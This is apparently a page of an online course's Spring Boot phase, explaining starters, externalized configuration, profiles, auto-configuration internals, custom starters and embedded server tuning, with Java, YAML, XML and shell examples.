Phase 13 · Days 279–298 · Lessons 279–298

Spring Boot

This phase turns the Spring container from Phase 12 into a deployable service with Spring Boot: starters and auto-configuration, type-safe externalized configuration, Actuator, logging, testing, packaging and runtime behaviour. Every later phase, starting with Spring MVC and REST APIs in Phase 14, is written as a Boot application, and the milestone project here is the production-shaped skeleton those phases build on.

By the end of this phase you can

  • Explain what SpringApplication.run and @SpringBootApplication do step by step, and use the condition evaluation report to say why any auto-configured bean exists or does not.
  • Manage dependencies through starters and the Boot BOM, override a managed version safely, and swap the embedded server or logging backend.
  • Bind configuration into validated @ConfigurationProperties records, predict which of a dozen property sources wins, and organise environments with profile groups and mounted secrets.
  • Write and test a custom auto-configuration and starter that users can override bean by bean.
  • Operate a service: secure Actuator on its own port, wire liveness and readiness to Kubernetes probes, change log levels live, emit structured logs with correlation ids, and shut down gracefully.
  • Build a fast test suite from slices and a shared cached @SpringBootTest context, with real databases from Testcontainers.
  • Ship it as a layered container image, and judge when CDS, AOT or a GraalVM native image is worth its constraints.

L279 · DAY 279

Spring Boot: Philosophy, Initializr & Project Anatomy

40m video45m practice

Spring Boot is not a new framework: it is the Spring you already know plus a layer that inspects the classpath and the environment and wires sensible beans for you. Every Boot feature follows one rule: an opinionated default you can override without fighting it.

What Boot adds to plain Spring

By Phase 12 you could build a Spring application by hand: declare a DataSource, a transaction manager, a DispatcherServlet, deploy a WAR to an external Tomcat, and keep dozens of library versions compatible. Boot removes that work in five ways.

FeatureWhat it replacesMechanism
Auto-configurationHand-written infrastructure beansConditional @Configuration classes keyed on the classpath and properties (L285)
StartersPicking and aligning library versionsCurated POMs plus the spring-boot-dependencies BOM (L280)
Embedded serverWAR deployment to a separate TomcatTomcat, Jetty or Undertow started inside your JVM (L287)
Production featuresCustom health and metrics plumbingActuator endpoints and Micrometer (L291)
Externalized configXML files and hard-coded settingsapplication.yml, env vars, profiles (L281)

There is no XML and no code generation at development time. A Boot app is an ordinary Java program with a main method that you run with java -jar.

Boot 3 baselineSpring Boot 3.x sits on Spring Framework 6 and requires Java 17 or newer (21 recommended) and Jakarta EE 9+ APIs (Boot 3 targets EE 10): every servlet, persistence and validation import is jakarta.*, not javax.*. Libraries built against javax.servlet will not work until they ship a Jakarta version (L297).
Definition · Opinionated defaultsBoot picks a default for every decision a typical service has to make (HikariCP for pooling, Jackson for JSON, Logback for logging, Tomcat on port 8080) and backs off as soon as you declare your own choice. Declaring your own DataSource bean makes the auto-configured one disappear, and setting server.port changes the port. Overriding never requires disabling Boot.

start.spring.io, field by field

The Initializr (web UI, IntelliJ wizard, or curl https://start.spring.io/starter.zip) generates a buildable skeleton. Each field has a consequence:

  • Project: Maven or Gradle (Groovy/Kotlin DSL). This track uses Maven.
  • Spring Boot version: pick the latest GA 3.5.x release for this phase; avoid SNAPSHOT and M/RC builds for real work.
  • Metadata: groupId (reverse domain, com.acme), artifactId (orders), and the package name, which becomes the root package of your code and so the root of component scanning.
  • Packaging: Jar (embedded server, the default and the right choice for containers) or War (only when you must deploy into an existing servlet container; adds a ServletInitializer).
  • Java: Boot 3 needs 17 or newer; choose 21 so you get virtual threads and record patterns.
  • Dependencies: each entry is a starter. Start small (Spring Web, Validation, Actuator) and add the rest when you need it.

The single Java file is the whole bootstrap:

package com.acme.orders;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class OrdersApplication {
    public static void main(String[] args) {
        SpringApplication.run(OrdersApplication.class, args);
    }
}
Definition · The meta-annotation@SpringBootApplication is exactly three annotations: @SpringBootConfiguration (a @Configuration that test support searches for to find your app), @EnableAutoConfiguration (imports the auto-configuration classes listed on the classpath), and @ComponentScan on the annotated class's package, with filters that keep auto-configuration classes out of the scan. Its exclude and scanBasePackages attributes are aliases for those inner annotations.

What SpringApplication.run does

  1. Construct SpringApplication: deduce the web type from the classpath (Spring MVC present means SERVLET, only WebFlux means REACTIVE, neither means NONE) and load initializers and listeners registered in META-INF/spring.factories.
  2. Prepare the Environment: add command-line args, system properties and env vars as property sources, then let environment post-processors load application.yml and profile files.
  3. Print the banner and create the context matching the web type (for servlet apps, a ServletWebServerApplicationContext).
  4. Prepare the context: run ApplicationContextInitializers and register your main class as the primary bean source.
  5. Refresh: the ordinary Spring refresh from Phase 12. ConfigurationClassPostProcessor processes your component scan first and the deferred auto-configuration import after it, so user beans are known before conditions such as "missing bean" are evaluated; then singletons are instantiated.
  6. Start the embedded web server during refresh, once the context is ready to serve.
  7. Publish ApplicationStartedEvent, then call every ApplicationRunner and CommandLineRunner (L296).
  8. Publish ApplicationReadyEvent. The JVM stays alive because the server's non-daemon threads keep running.

Package structure

Component scanning starts at the main class's package and descends. Put OrdersApplication in the root package (com.acme.orders) and every feature below it. Prefer package by feature (orders.order, orders.payment, each holding its controller, service, repository) over package by layer (controller/, service/): features can then use package-private visibility and later split into modules cleanly. Never use the default package: an annotated class there would scan every jar on the classpath.

What breaks in production
  • Main class in a sibling package (com.acme.app while controllers live in com.acme.api): nothing fails at startup, but every request returns the Whitelabel 404 because the controllers were never scanned.
  • Adding @EnableWebMvc out of habit tells Boot you are taking full control of MVC, which switches off its MVC auto-configuration (Jackson converter settings, static resources). Use a WebMvcConfigurer bean instead.
  • Both web and webflux starters on the classpath: Boot picks SERVLET, and the reactive controllers you expected never start.
  • Unpinned versions: writing explicit versions for managed libraries defeats the BOM and leads to NoSuchMethodError at runtime.

L280 · DAY 280

Starters: What They Are & the BOM That Powers Them

40m video40m practice

A starter contains no code: it is a POM whose only job is to pull a tested set of libraries onto your classpath, and the versions of all of them come from one bill of materials, spring-boot-dependencies. Understanding those two files explains why Boot builds rarely suffer version conflicts, and how to override a version without breaking that.

A starter is an empty POM

Definition · StarterA starter is a Maven artifact with packaging jar but no classes, whose POM declares a curated set of transitive dependencies for one capability. Official starters are named spring-boot-starter-*; third-party ones follow acme-spring-boot-starter (L286). Adding the starter puts the libraries on the classpath, and auto-configuration (L285) reacts to their presence.

Open spring-boot-starter-web's POM (in the IDE: Ctrl-click the artifactId, or ./mvnw dependency:tree). It declares exactly five dependencies:

The first child, spring-boot-starter, is the core starter that every other starter depends on: spring-boot (SpringApplication, config binding), spring-boot-autoconfigure, spring-boot-starter-logging (Logback plus the SLF4J bridges, L288), jakarta.annotation-api, spring-core, and SnakeYAML so that application.yml works.

spring-boot-starter-parent

The generated POM inherits spring-boot-starter-parent, whose own parent is spring-boot-dependencies. Between them you inherit:

  • Dependency management: a <dependencyManagement> block with versions for Spring, Jackson, Hibernate, Tomcat, JDBC drivers, Testcontainers and hundreds more, each driven by a property such as postgresql.version.
  • Java version: the java.version property (17 by default in Boot 3) feeds maven.compiler.release.
  • Plugin management: preconfigured compiler (with -parameters, which constructor binding and @PathVariable without explicit names rely on), Surefire, Failsafe, jar and spring-boot-maven-plugin with its repackage goal bound.
  • Resource filtering of application*.yml/yaml/properties using @project.version@ delimiters, because ${...} belongs to Spring's own placeholders.
  • Encoding: UTF-8 for source and reporting.

When you already have a corporate parent: import the BOM

Maven allows one parent. If your company mandates com.acme:platform-parent, import Boot's BOM instead. You lose the plugin configuration, so bind repackage yourself.

<dependencyManagement>
  <dependencies>
    <!-- an override must come BEFORE the BOM: first declaration wins -->
    <dependency>
      <groupId>org.postgresql</groupId>
      <artifactId>postgresql</artifactId>
      <version>42.7.7</version>
    </dependency>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-dependencies</artifactId>
      <version>3.5.6</version>
      <type>pom</type>
      <scope>import</scope>
    </dependency>
  </dependencies>
</dependencyManagement>
<build><plugins><plugin>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-maven-plugin</artifactId>
  <version>3.5.6</version>
  <executions><execution><goals><goal>repackage</goal></goals></execution></executions>
</plugin></plugins></build>

Never write a version; override deliberately

For any managed artifact, omit <version>. Boot's release process tests the whole set together; a hand-picked version for one library (say, a newer Jackson) can compile fine and fail at runtime with NoSuchMethodError because another managed library was built against the old one. Override only for a reason such as a CVE fix, and prefer the narrowest knob:

<!-- with starter-parent: override the property, every artifact in the group follows -->
<properties>
  <postgresql.version>42.7.7</postgresql.version>
</properties>

$ ./mvnw help:effective-pom | grep -A2 '<artifactId>postgresql'    # verify what you got
Where the property names liveThe property names (jackson-bom.version, hibernate.version, tomcat.version…) are listed in the Boot reference appendix "Dependency Versions". Overriding through a property only works with the parent; with an imported BOM, properties in your POM do not reach it.

What breaks in production
  • Excluding Tomcat without adding a replacement: the Servlet API disappears with it, Boot deduces a non-web application, and the process starts and exits with code 0. Health checks then fail with no error in the log.
  • Mismatched release trains: a Spring Cloud BOM built for an older Boot line imported next to a newer Boot BOM gives startup failures deep inside auto-configuration. Check the compatibility table before upgrading either.
  • Version on a starter (spring-boot-starter-web:3.2.0 under a 3.5 parent) mixes two Boot generations on one classpath.
  • Property override with an imported BOM silently does nothing; read the effective POM.

Configuration Files: Properties, YAML & Relaxed Binding

40m video40m practice

Every configuration file Boot reads is flattened into string key/value pairs inside the Environment; binding then maps those keys onto Java types with forgiving name matching and rich type conversion. Once you see the flat key underneath, properties and YAML are just two spellings of the same thing.

Two syntaxes, one flat model

Boot loads application.properties and application.yml (both, if present; for the same key in the same location, .properties wins). YAML is nested and lists are sequences; under the hood Boot flattens it to server.port, app.allowed-origins[0], and so on.

# application.yml
server:
  port: 8080
app:
  name: orders
  greeting: "Hello from ${app.name}"      # placeholder, resolved at read time
  owner: ${APP_OWNER:platform-team}       # env var with a default
  instance-id: ${random.uuid}
  http:
    timeout: 30s                          # Duration
    max-body: 10MB                        # DataSize
  allowed-origins:                        # List
    - https://shop.example.com
    - https://admin.example.com
  limits:                                 # Map<String, Integer>
    free: 10
    pro: 1000
    "[/api/**]": 50                       # brackets keep special characters in map keys
  footer: |                               # literal block: newlines kept
    Acme Corp
    Support: help@example.com
---
spring:
  config:
    activate:
      on-profile: prod
server:
  port: 80
# the same thing as application.properties
server.port=8080
app.greeting=Hello from ${app.name}
app.http.timeout=30s
app.allowed-origins[0]=https://shop.example.com
app.allowed-origins[1]=https://admin.example.com
app.footer=Acme Corp\nSupport: help@example.com
#---
spring.config.activate.on-profile=prod
server.port=80

A --- line (or #--- in a properties file) starts a new document; later documents override earlier ones for keys they redefine. In YAML, | keeps newlines and > folds lines into one, which is useful for SQL or certificate blobs. In properties, a list can also be comma-separated: app.allowed-origins=a,b.

Relaxed binding

Definition · Relaxed bindingWhen binding to @ConfigurationProperties (L282), Boot converts each key to a ConfigurationPropertyName and compares in a uniform form that ignores case and dashes. So spring.datasource.hikari.maximumPoolSize, maximum-pool-size, maximum_pool_size and the environment variable SPRING_DATASOURCE_HIKARI_MAXIMUMPOOLSIZE all set the same field. For ordinary properties Boot also accepts the dashes-as-underscores env form (..._MAXIMUM_POOL_SIZE), but not for map keys. Write kebab-case in files: it is the canonical form, the one the docs and IDE metadata use, and the only form that @Value matches reliably against every other spelling.

Placeholders, random values and type conversion

${key} resolves against the whole Environment at read time, so it can point at another property, an env var, or a system property; ${key:default} supplies a fallback. random.* generates values: ${random.uuid}, ${random.int}, ${random.long}, ${random.int(10)}, ${random.int[1024,65535]}. Use them for instance IDs or test ports, never for secrets.

import java.time.Duration;
import java.util.List;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.boot.context.properties.bind.Bindable;
import org.springframework.boot.context.properties.bind.Binder;
import org.springframework.core.env.Environment;
import org.springframework.stereotype.Component;

@Component
class ConfigDump implements ApplicationRunner {
    private static final Logger log = LoggerFactory.getLogger(ConfigDump.class);
    private final Environment env;
    private final Duration timeout;

    ConfigDump(Environment env, @Value("${app.http.timeout:5s}") Duration timeout) {
        this.env = env;
        this.timeout = timeout;
    }

    @Override
    public void run(ApplicationArguments args) {
        // A YAML list is stored as app.allowed-origins[0], [1]...; @Value("${app.allowed-origins}") fails.
        List<String> origins = Binder.get(env)
                .bind("app.allowed-origins", Bindable.listOf(String.class))
                .orElse(List.of());
        log.info("timeout={}ms origins={} greeting={}",
                timeout.toMillis(), origins, env.getProperty("app.greeting"));
    }
}

Profile files and imports

application-prod.yml is loaded in addition to application.yml when the prod profile is active and overrides it key by key (L284). Inside one file, spring.config.activate.on-profile (or on-cloud-platform: kubernetes) makes a document conditional. spring.config.import pulls in more sources, and values from an imported file override the file that imported them:

spring:
  config:
    import:
      - optional:file:./local-overrides.yml   # optional: no failure if missing
      - classpath:features.yml
      - optional:configtree:/etc/orders/      # one file per key, e.g. Kubernetes secrets

Without optional:, a missing import fails startup with ConfigDataResourceNotFoundException, which is what you want for config the app cannot run without. Config trees are covered in L283.

Finding the property you need

Do not guess keys. The Boot reference appendix "Application Properties" lists every built-in key grouped by area (core, web, data, actuator…). Your IDE autocompletes from META-INF/spring-configuration-metadata.json shipped in each autoconfigure jar, and at runtime Actuator's /configprops shows what each properties bean actually bound (L291). An unknown key is silently ignored, so a typo looks like "the setting does nothing".

What breaks in production
  • YAML 1.1 surprises: SnakeYAML reads unquoted no, off, yes as booleans and 0123 as an octal number, so a country code NO or an ID with a leading zero arrives mangled. Quote such values.
  • Unitless durations: timeout: 30 is 30 milliseconds, not seconds. Always write the unit.
  • Tabs in YAML indentation fail to parse; mixed indentation silently re-nests a key under the wrong parent.
  • Typos are silent: sever.port does nothing. Typed properties classes with validation (L282) catch errors that a bare key cannot.

@ConfigurationProperties: Type-Safe Configuration

45m video50m practice

A @ConfigurationProperties record turns a prefix of the Environment into one immutable, validated, documented Java object. Bad configuration then stops the deploy with a precise report, instead of surfacing as a NullPointerException hours later.

Declaring and registering a properties type

Annotate a type with the prefix it owns, then register it. Properties classes are not picked up by ordinary component scanning; use one of:

  • @ConfigurationPropertiesScan on the main class: scans its package tree for @ConfigurationProperties types (the usual choice in applications).
  • @EnableConfigurationProperties(MailProperties.class) on a @Configuration: explicit, and the standard choice inside auto-configuration (L286).
Definition · Constructor bindingIf the type has a single parameterized constructor (every record does), Boot binds by calling that constructor with converted values, so the result can be immutable. With several constructors, mark the one to use with @ConstructorBinding (since Boot 3 in org.springframework.boot.context.properties.bind; it is no longer needed on the type). A class with a no-arg constructor and setters uses JavaBean binding instead. Parameter names come from the -parameters compiler flag that the starter parent sets.
package com.acme.orders.mail;

import jakarta.validation.Valid;
import jakarta.validation.constraints.*;
import java.time.Duration;
import java.util.List;
import java.util.Map;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.bind.DefaultValue;
import org.springframework.util.unit.DataSize;
import org.springframework.validation.annotation.Validated;

@Validated
@ConfigurationProperties(prefix = "app.mail")
public record MailProperties(
        @NotBlank @Email String from,
        @DefaultValue("smtp") Transport transport,
        @DefaultValue("10s") Duration timeout,
        @DefaultValue("25MB") DataSize maxAttachment,
        @Valid @NotNull Smtp smtp,
        List<@Email String> bcc,
        Map<String, @Valid Template> templates) {

    public enum Transport { SMTP, SES, LOG }

    public record Smtp(@NotBlank String host,
                       @DefaultValue("587") @Min(1) @Max(65535) int port,
                       boolean starttls) {}

    public record Template(@NotBlank String subject, @DefaultValue("en") String locale) {}

    public MailProperties {                       // compact constructor: defensive copies
        bcc = bcc == null ? List.of() : List.copyOf(bcc);
        templates = templates == null ? Map.of() : Map.copyOf(templates);
    }
}
app:
  mail:
    from: noreply@acme.com
    transport: ses               # relaxed enum match: SES
    timeout: 5s
    smtp:
      host: smtp.acme.com
    bcc: [audit@acme.com]
    templates:
      order-shipped: { subject: "Your order is on its way" }
      password-reset: { subject: "Reset your password", locale: de }

Nested records bind from nested keys, List<T> from sequences, Map<String, T> from child keys (the key is the map key), and Duration, DataSize and enums use the conversions from L281. @DefaultValue supplies a value when nothing is bound; it is the constructor-binding equivalent of a field initializer, which records cannot have. Without it, a missing object is null, a missing int is 0 and a missing boolean is false.

Fail fast: validation at startup

With spring-boot-starter-validation on the classpath and @Validated on the type, Boot validates the bound object. Nested objects need @Valid to be validated in turn. A failure is turned by a FailureAnalyzer into a readable report:

***************************
APPLICATION FAILED TO START
***************************
Description:
Binding to target ... MailProperties failed:

    Property: app.mail.from
    Value: "noreply-at-acme"
    Origin: class path resource [application.yml] - 3:11
    Reason: must be a well-formed email address

Action:
Update your application's configuration

This is the whole point: the bad value, the file and line it came from, and the rule it broke, at deploy time while the old version is still serving.

Externalized Configuration & Precedence

40m video40m practice

The Environment is an ordered list of property sources, and the first source that defines a key wins. Knowing that order lets you build one artifact and change its behaviour in every environment from the outside, which is the twelve-factor ideal.

The precedence order

Config data files have their own internal order. Highest first:

RankFileExample
1profile-specific, outside the jar./config/application-prod.yml
2plain, outside the jar./application.yml
3profile-specific, inside the jarclasspath:application-prod.yml
4plain, inside the jarclasspath:application.yml

Some summaries put "profile-specific inside" above "plain outside"; since Boot 2.4 the reference documents the order above, so an operator's external application.yml beats a profile file baked into the jar. Within each rank, the search locations are classpath:/, classpath:/config/, file:./, file:./config/ and file:./config/*/, with later ones overriding earlier ones.

Demonstrating every level

$ java -jar orders.jar                                       # 8080 from classpath:application.yml
$ echo 'server.port: 8081' > application.yml && java -jar orders.jar   # 8081: file outside the jar
$ SERVER_PORT=8082 java -jar orders.jar                      # 8082: env var beats files
$ SERVER_PORT=8082 java -Dserver.port=8083 -jar orders.jar   # 8083: system property beats env
$ SPRING_APPLICATION_JSON='{"server":{"port":8084}}' java -Dserver.port=8083 -jar orders.jar  # 8084
$ java -jar orders.jar --server.port=8085                    # 8085: command line beats all of the above

To see the stack from inside the app, list the sources and ask each one for the key:

Twelve-factor config and config trees

Factor III of the twelve-factor app says config, meaning everything that varies between deploys (URLs, credentials, feature flags, pool sizes), lives in the environment, never in the code or the artifact. The test: could you open-source the repository right now without leaking a credential? The payoff is that the exact jar or image tested in staging is the one promoted to production, with only its environment changed.

Kubernetes Secrets are usually mounted as files, one per key. A config tree turns such a directory into properties: the path below the root becomes the key and the file content becomes the value.

/etc/secrets/
├── db/
│   ├── username      → db.username
│   └── password      → db.password
└── stripe-api-key    → stripe-api-key

spring:
  config:
    import: "optional:configtree:/etc/secrets/"
  datasource:
    username: ${db.username}
    password: ${db.password}

Secrets and the /env endpoint

  • Environment variables: simple and universal, but visible to anything that can read the process environment and easy to leak in crash reports. Acceptable for low-risk values.
  • Mounted files / config trees: the Kubernetes default; files can be rotated without changing the pod spec.
  • Secret managers: HashiCorp Vault (Spring Cloud Vault) or AWS Secrets Manager (Spring Cloud AWS) plug in through spring.config.import with their own location prefixes, giving audit logs, rotation and short-lived credentials.
  • GitOps: Sealed Secrets or External Secrets Operator keep only encrypted values or references in Git.

Actuator's /env and /configprops show every source and value, which is invaluable for debugging precedence. Since Boot 3.0 their values are masked by default; management.endpoint.env.show-values accepts NEVER (default), WHEN_AUTHORIZED or ALWAYS, and a SanitizingFunction bean customizes what is masked (L291).

What breaks in production
  • A password in application.yml: once committed it lives in Git history forever. Rotate it; deleting the line is not enough.
  • spring.config.location instead of additional-location: the defaults are replaced, the jar's own application.yml is no longer read, and half the settings disappear.
  • A stray env var left on a host (SERVER_PORT, SPRING_PROFILES_ACTIVE) silently beats every file. Read /env before assuming a file change "did not work".
  • Unprotected /heapdump leaks every secret in memory, masked or not.

Profiles in Boot: Groups, Overrides & Patterns

35m video35m practice

A profile is a named switch that adds configuration documents and beans on top of the base set; it never replaces the base. Use profiles for "which environment am I in", keep the number small with groups, and test the production profile's bean graph before production does it for you.

Profile files merge, they do not replace

Activate profiles with SPRING_PROFILES_ACTIVE=prod, --spring.profiles.active=prod, or spring.profiles.active in a non-profile file. Boot then loads application.yml and application-prod.yml, and the profile file overrides only the keys it redefines; everything else is inherited. With several active profiles, later ones win: under prod,eu, application-eu.yml beats application-prod.yml. If nothing is activated, the profile named default is active (change it with spring.profiles.default).

Groups versus include

# application.yml  (base document: groups must be declared here)
spring:
  profiles:
    group:
      prod: prod-db, prod-cache, monitoring
      dev: dev-db, local-mail
---
spring:
  config:
    activate:
      on-profile: "prod & !eu"       # profile expressions: &, |, !
app:
  data-residency: us

spring.profiles.include also adds profiles, but it is unconditional: whatever you list is always on, and since Boot 2.4 it may appear only in non-profile-specific documents. Groups are conditional and self-documenting ("prod means these four"), so prefer groups for composition and keep include for something every environment needs, which is rarely a profile at all.

The legacy key and multi-document files

Definition · Document activationIn one multi-document YAML file each --- section can declare spring.config.activate.on-profile (and on-cloud-platform); the section is used only when the condition holds. This key replaced the old spring.profiles key inside documents. The old key was deprecated in Boot 2.4, and in Boot 3 Boot rejects it at startup with an InvalidConfigDataPropertyException naming the replacement. Likewise, setting spring.profiles.active or include inside a profile-specific document is an error: activation cannot depend on what is already active.

Pitfalls and testing

What breaks in production
  • Forgetting to activate the profile: with @Profile("dev") fakes and no profile set, production runs as default. Either make the unprofiled configuration the safe production one, or fail fast when no profile is active.
  • Bean graphs that only exist in prod: sesMailSender needs an SesV2Client bean that nobody declared. Dev and CI are green; the first prod start fails with an unsatisfied dependency.
  • Profile sprawl (dev-alice, prod-hotfix): ten profiles means hundreds of combinations nobody tests. Keep one per environment plus a few groups.
  • "Works on my machine": a developer's application-dev.yml enables a setting that production lacks. Diff the effective config (/env) between environments.

Auto-Configuration Internals

50m video45m practice

Auto-configuration is ordinary @Configuration classes, imported last and guarded by conditions. The classpath decides which ones apply, your own beans decide which ones back off, and the condition evaluation report tells you exactly which happened and why.

From the annotation to a candidate list

Definition · Auto-configuration import@EnableAutoConfiguration imports AutoConfigurationImportSelector, a DeferredImportSelector. It reads every META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports file on the classpath (one class name per line), removes exclusions, drops classes whose @ConditionalOnClass fails using precomputed spring-autoconfigure-metadata.properties (so non-matching classes are never even loaded), sorts the rest, and hands them to the normal configuration class parser. The .imports file was introduced in Boot 2.7; Boot 3.0 stopped reading auto-configurations from spring.factories.

Reading real auto-configurations

Open these in your IDE (they live in spring-boot-autoconfigure). Abridged from Boot 3.x; details vary between minor versions:

@AutoConfiguration(before = SqlInitializationAutoConfiguration.class)
@ConditionalOnClass({ DataSource.class, EmbeddedDatabaseType.class })  // JDBC on the classpath?
@ConditionalOnMissingBean(type = "io.r2dbc.spi.ConnectionFactory")    // not a reactive app
@EnableConfigurationProperties(DataSourceProperties.class)             // spring.datasource.*
public class DataSourceAutoConfiguration {

    @Configuration(proxyBeanMethods = false)
    @Conditional(PooledDataSourceCondition.class)                       // a pool or a URL is present
    @ConditionalOnMissingBean({ DataSource.class, XADataSource.class }) // YOUR DataSource wins
    @Import({ DataSourceConfiguration.Hikari.class, DataSourceConfiguration.Tomcat.class,
              DataSourceConfiguration.Dbcp2.class, DataSourceConfiguration.Generic.class })
    protected static class PooledDataSourceConfiguration { }
}
// DataSourceConfiguration.Hikari: @ConditionalOnClass(HikariDataSource.class) and
// @ConditionalOnProperty(name = "spring.datasource.type", havingValue = "...HikariDataSource",
// matchIfMissing = true); its @Bean method is @ConfigurationProperties("spring.datasource.hikari").
  • JpaRepositoriesAutoConfiguration: runs after HibernateJpaAutoConfiguration, requires a DataSource bean and JpaRepository on the classpath, honours spring.data.jpa.repositories.enabled, and backs off if a JpaRepositoryFactoryBean exists, which is what writing your own @EnableJpaRepositories creates.
  • WebMvcAutoConfiguration: @ConditionalOnWebApplication(type = SERVLET), @ConditionalOnClass on Servlet, DispatcherServlet and WebMvcConfigurer, and @ConditionalOnMissingBean(WebMvcConfigurationSupport.class). @EnableWebMvc registers exactly such a bean, which is why it switches Boot's MVC setup off (L279).

Classpath-driven and user-wins

Why missing classes do not crash@ConditionalOnClass(HikariDataSource.class) names a class that may be absent. It still works because Spring reads configuration class annotations from bytecode with ASM, where the class literal is just a name string, and checks it against the class loader before loading the configuration class. That is also why such conditions belong on classes or nested classes, not on @Bean methods whose return type mentions the missing class.

@ConditionalOnMissingBean checks the bean definitions registered so far. Since auto-configurations are processed after all user configuration, declaring your own bean of that type always wins. The flip side: these bean conditions are only reliable in auto-configuration classes; in your own @Configuration the answer depends on registration order. Order among auto-configurations is set with @AutoConfiguration(before = ..., after = ...) (or the older @AutoConfigureBefore/@AutoConfigureAfter) and coarse @AutoConfigureOrder; these affect only auto-configurations, never your classes.

import org.springframework.beans.factory.config.ConfigurableListableBeanFactory;

@Component
class AutoConfigStats implements ApplicationRunner {
    private final ConfigurableListableBeanFactory beanFactory;
    AutoConfigStats(ConfigurableListableBeanFactory beanFactory) { this.beanFactory = beanFactory; }

    @Override
    public void run(ApplicationArguments args) {
        var candidates = new ArrayList<String>();
        ImportCandidates.load(AutoConfiguration.class, getClass().getClassLoader()).forEach(candidates::add);
        var report = ConditionEvaluationReport.get(beanFactory);
        long negative = report.getConditionAndOutcomesBySource().values().stream()
                .filter(c -> !c.isFullMatch()).count();
        System.out.printf("%d candidates, %d sources with a failed condition, %d excluded%n",
                candidates.size(), negative, report.getExclusions().size());
    }
}

Excluding, and what it costs at startup

  1. @SpringBootApplication(exclude = DataSourceAutoConfiguration.class), or excludeName when the class may be absent.
  2. spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration, which can differ per profile.
  3. Remove the dependency. Usually the right answer: if you exclude the auto-configuration but keep the jar, you carry its weight and its CVEs for nothing.

Filtering a few hundred candidates is cheap thanks to the metadata file; the real startup cost is the beans that matched classes create, so trim starters you don't use. For component scanning, spring-context-indexer writes META-INF/spring.components at compile time so scanning needs no classpath walk; it was deprecated in Spring Framework 6.1 in favour of AOT processing (L298), so treat it as legacy.

What breaks in production
  • A transitive jar flips a condition: a library upgrade drags in spring-webflux or an embedded database, and new beans appear. Diff the condition report between builds when behaviour changes after a dependency bump.
  • Your bean of the "wrong" type: declaring an ObjectMapper bean makes Jackson auto-configuration back off for it, and with it Boot's spring.jackson.* settings and registered modules.
  • @ConditionalOnMissingBean in application config: works locally, fails when scan order changes.

Writing Your Own Auto-Configuration & Starter

50m video60m practice

A custom starter is the same machinery Boot uses for itself: an @AutoConfiguration class with conditions, listed in an .imports file, plus a properties record and a POM that brings the dependencies. Done well, consumers add one dependency, get working defaults, and can replace every bean.

Module layout and naming

The autoconfigure module holds the code and marks integration libraries <optional>true</optional>, so it can support several back ends with @ConditionalOnClass. The starter is an empty POM depending on autoconfigure plus the libraries for the default choice. One combined module is fine for an internal library with a single back end. Name them acme-audit-spring-boot-starter and acme-audit-spring-boot-autoconfigure: the spring-boot prefix is reserved for official artifacts, and your keys need their own namespace (acme.audit.*), never spring.* or server.*.

The library: an @Auditable annotation

// com.acme.audit (several files shown together)
@Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) @Documented
public @interface Auditable { String action(); }

public record AuditEvent(Instant at, String action, String method, boolean success, long millis) {}

public interface AuditSink { void write(AuditEvent event); }

@ConfigurationProperties("acme.audit")
public record AuditProperties(
        @DefaultValue("true") boolean enabled,
        @DefaultValue("log") Sink sink,              // LOG or MEMORY, relaxed case
        @DefaultValue("AUDIT") String loggerName) {
    public enum Sink { LOG, MEMORY }
}

@Aspect
public class AuditAspect {
    private final AuditSink sink;
    private final Clock clock;
    public AuditAspect(AuditSink sink, Clock clock) { this.sink = sink; this.clock = clock; }

    @Around("@annotation(auditable)")
    public Object audit(ProceedingJoinPoint pjp, Auditable auditable) throws Throwable {
        Instant start = clock.instant();
        boolean ok = false;
        try {
            Object result = pjp.proceed();
            ok = true;
            return result;
        } finally {
            long ms = Duration.between(start, clock.instant()).toMillis();
            sink.write(new AuditEvent(start, auditable.action(), pjp.getSignature().toShortString(), ok, ms));
        }
    }
}

LogAuditSink (writes each event to the named SLF4J logger) and InMemoryAuditSink (a thread-safe list, handy in tests) are a few lines each.

The auto-configuration class

package com.acme.audit.autoconfigure;

@AutoConfiguration(after = AopAutoConfiguration.class)
@ConditionalOnClass(Aspect.class)                                    // AspectJ present
@ConditionalOnProperty(prefix = "acme.audit", name = "enabled",
                       havingValue = "true", matchIfMissing = true)  // on unless switched off
@EnableConfigurationProperties(AuditProperties.class)
public class AuditAutoConfiguration {

    @Bean
    @ConditionalOnMissingBean                                        // a user AuditSink wins
    AuditSink auditSink(AuditProperties props) {
        return switch (props.sink()) {
            case LOG -> new LogAuditSink(props.loggerName());
            case MEMORY -> new InMemoryAuditSink();
        };
    }

    @Bean
    @ConditionalOnMissingBean
    AuditAspect auditAspect(AuditSink sink, ObjectProvider<Clock> clock) {
        return new AuditAspect(sink, clock.getIfAvailable(Clock::systemUTC));
    }
}

Algorithm · Starter design rules
  1. Give every bean @ConditionalOnMissingBean so users can replace it.
  2. Make the zero-configuration defaults safe and useful.
  3. @AutoConfiguration implies proxyBeanMethods = false: pass collaborators as method parameters, never by calling another @Bean method.
  4. Put class conditions on the class (or a nested class), never only on a method whose signature names the optional type.
  5. Never component-scan from an auto-configuration.

Embedded Servers, Tuning & Virtual Threads

45m video45m practice

The embedded server is a bean built by a factory that Boot configures from server.* properties. Tuning it means understanding three limits (connections, queued connections, worker threads), and virtual threads replace the third with something far larger, which moves your bottleneck rather than removing it.

How the server is created

ServletWebServerFactoryAutoConfiguration registers a TomcatServletWebServerFactory (or the Jetty or Undertow factory, whichever classes are present). During refresh, ServletWebServerApplicationContext.onRefresh() asks the factory for a WebServer, registering the DispatcherServlet and filters through ServletContextInitializers; the server begins accepting requests near the end of refresh. Before the factory is used, a bean post-processor applies every WebServerFactoryCustomizer: Boot's own (which map ServerProperties onto the factory) and yours.

Throughput with blocking handlers follows Little's law: throughput = concurrency ÷ latency. With 200 workers and 100 ms per request, the server cannot exceed about 2,000 requests per second however many cores it has. Raising threads.max buys concurrency at roughly 1 MB of reserved stack and a kernel thread each.

TLS, HTTP/2, and other servers

